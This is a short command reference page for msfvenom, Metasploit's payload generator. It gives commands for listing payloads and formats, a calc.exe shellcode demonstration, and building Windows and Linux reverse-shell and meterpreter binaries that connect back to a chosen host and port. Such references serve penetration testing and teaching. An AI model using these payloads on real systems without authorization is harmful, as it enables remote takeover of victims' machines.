# msfvenom

> Manually generate payloads for metasploit.
> More information: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- List payloads:

`msfvenom -l payloads`

- List formats:

`msfvenom -l formats`

- Show payload options:

`msfvenom -p {{payload}} --list-options`

- Launch the calculator on windows - ignore bad characters, 32bit platform:

`msfvenom -p windows/exec CMD="calc.exe" -f c -b "\x00\x0a\x0d\x20\xff" -a x86 --platform Windows`

- Create a windows payload with a reverse shell over TCP:

`msfvenom -p windows/shell_reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f c`

- Create an ELF binary with a reverse TCP handler:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf > {{path/to/binary}}`

- Create an EXE binary with a reverse TCP handler:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe > {{path/to/binary.exe}}`
